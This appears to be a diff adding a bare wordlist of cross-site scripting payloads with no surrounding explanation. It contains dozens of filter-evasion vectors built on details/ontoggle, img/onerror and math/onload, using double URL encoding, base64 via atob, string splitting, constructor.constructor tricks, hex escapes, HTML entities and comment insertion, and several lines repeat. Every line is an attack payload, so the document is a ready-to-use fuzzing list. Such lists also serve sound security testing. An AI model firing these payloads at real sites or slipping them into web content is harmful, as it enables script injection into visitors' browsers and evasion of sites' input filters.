@@ -1,0 +1,65 @@
+%253Cinput%2520value%253Dx%2520onfocus%253Dalert(1)%253E
+%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setInterval%2528%2527parent%255B%255C%2527al%255C%2527%252B%2520%255C%2527ert%255C%2527%255D%2528%255Cu0031%2529%2527%252C100%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528Function%2528atob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529%252C0%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528eval%252C0%252Catob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528eval%252C0%252Catob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528eval%252C0%252Catob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setInterval%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C%252Fdetails%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C/details%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528atob%2528%2527YWxlcnQoMSk%253D%2527%2529%252C0%2529%2522%253E%253C/details%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522%255B%255D.constructor.constructor%2528%2527al%2527%252B%2527ert%25281%2529%2527%2529%2528%2529%2522%253E%253C/details%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C/details%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522%255B%255D.constructor.constructor%2528%2527al%2527%252B%2527ert%25281%2529%2527%2529%2528%2529%2522%253E%253C/details%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C/details%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%2528%255C%25274%255C%2527%2529%2527%252C0%2529%2522%253E%253C/details%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%2527%252B%2527ert%25281%2529%2527%252C0%2529%2522%253E%253C/details%253E
+%253Cdetails%2520open%2520ontoggle%253D%2522setTimeout%2528%2527al%255Cu0065rt%25281%2529%2527%252C0%2529%2522%253E%253C/details%253E
+<details open ontoggle="[].constructor.constructor('al'+'ert(1)')()"></details>
+<details open ontoggle="[].constructor.constructor('al'+'ert(1)')()"></details>
+><img src\r\n=\r\nx one%0a%0drror\r\n=\r\nsetTimeout`'al'+'ert`1`',0`>\"
+<img src=x one%09rror=ale%09rt('XSS')>\"><a hre%0a%0df=#>x</a>
+><imG SRc=x ONE/*x*/rRor=\"JavasCR/*x*/IPT:Al/*X*/eRT(1)\">
+<img src=x one%09rror=ale%0a%0drt('XSS')>
+<img src=x one%09rror='/*\\n*/ale%0a%0drt(1)'>
+><img src=x one/*x*/rror='/*\\n*/al/*x*/ert(1)'>
+><img/src=x/onerror/*x*/onerror='/*\\n*/al/*x*/ertal/*x*/ert(1)'>
+<img src=x one%09rroronerror=document.location='javascr%09iptscr%0a%0dipt:ale%0a%0drtale%0a%0drt`1`'>
+/><img src\r\n\t=\t\r\nx one/*x*/rror\r\n\t=\t\r\n\"Function`al/*x*/ert(1)`()\"></img>
+<img//src=x//one%09rror='Function`ale%09rt(1)`()'></img>\"
+<img src\r\n=\r\nx o/*x*/ne%0a%0d/*x*/rror\r\n=\r\n\"Function`al/*x*/ert`1````\"></img>
+\\\"\\>\\<img one%0a%0drror=ale%09rt(1) src=1\\>
+<img/src=x/onerror=window/>
+;<img src=x one/*x*/rror=al/*x*/ert('XSS')>
+<img SrC=x one%0a%0dRrOr/*x*/one%09RrOr=wIndoW ><scR/*x*/ipTscR/*x*/ipT>AL/*x*/erTAL/*x*/erT(1)</sCR/*x*/IPtsCR/*x*/IPt>\"><a hre%09f=#>x</a>
+<img src=x one%09rror=\"this.one%0a%0drror=null;ale%0a%0drt(1)\">
+<img//src=x//one/*x*/rror=\"javascr/*x*/ipt:al/*x*/ert(1)\">\"><a hr/*x*/ef=#>x</a>
+<img src=x one%09rror='Function`con%0a%0dfirm(1)`'>
+<img src\r\n=\r\nx o/*x*/ne%09/*x*/rror\r\n=\r\nwindow >
+<imG Src=X &#79;&#110;&#101;/*x*/RrOr=\"JavAsCr/*x*/iPt:Al/*x*/ErT(1)\">
+<img src=x one%09rror=\"Function`ale%09rt(1)`()\"></img>\"><a hre%09f=#>x</a>
+\"><img one/*x*/rror=al/*x*/ert(1) src=1>
+><img src=x one/*x*/rror='/*\\n*/al/*x*/ert`1`'>
+<img src=x one%0a%0drror='/*\\n*/con%09firm(1)'>
+<ImG//sRC=x//OneRRorOneRRor=WindOw>/*--*/
+><img src=x one/*x*/rror=window>
+<iMg sRC=x One/*x*/RroR=wIndOW>\"><a href=#>x</a>\"><a href=#>x</a>
+<img//src=x//onerroronerror='Function`alertalert(1)`()'></img>\"><a//href=#>x</a>'
+<IMG SrC=X one%09RroR=\"fUnCTiON`AlE%09RT(1)`()\"></iMG>
+<img/src=x/onerror=setTimeout`'al'+'ert`1`',0`>
+<img src=x one%09rror='/*\\n*/ale%09rt(1)'>
+<img src=x one/*x*/rror=window ><scr/*x*/ipt>con/*x*/firm(1)</scr/*x*/ipt>
+<img/src=x/&#111;&#110;&#101;&#114;&#114;&#111;&#114;=setTimeout`'al'+'ert`1`',0`>\"><a/&#104;&#114;&#101;&#102;=#>x</a>
+><img/src=x/onerror='/*\\n*/alert`1`'>
+[]['\x66\x69\x6c\x74\x65\x72']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('a\x6c\x65\x72\x74(1)')()
+%25%33%43%25%73%25%76%25%67%25%20%25%6f%25%6e%25%6c%25%6f%25%61%25%64%25%3d%25%61%25%6c%25%65%25%72%25%74%25%28%25%31%25%29%25%3e
+%253Cmath%253E%253Cmi%252F%252Fonload%253Dalert%25281%2529%253E
+%253CdEtAiLs%250Aopen%250Aontoggle%253Dalert%25281%2529%253E
+%253Cimg%252Fsrc%253Dx%252Fonerror%253Dalert%25281%2529%253E
+<img/src=x/one/*x*/rror=window/>
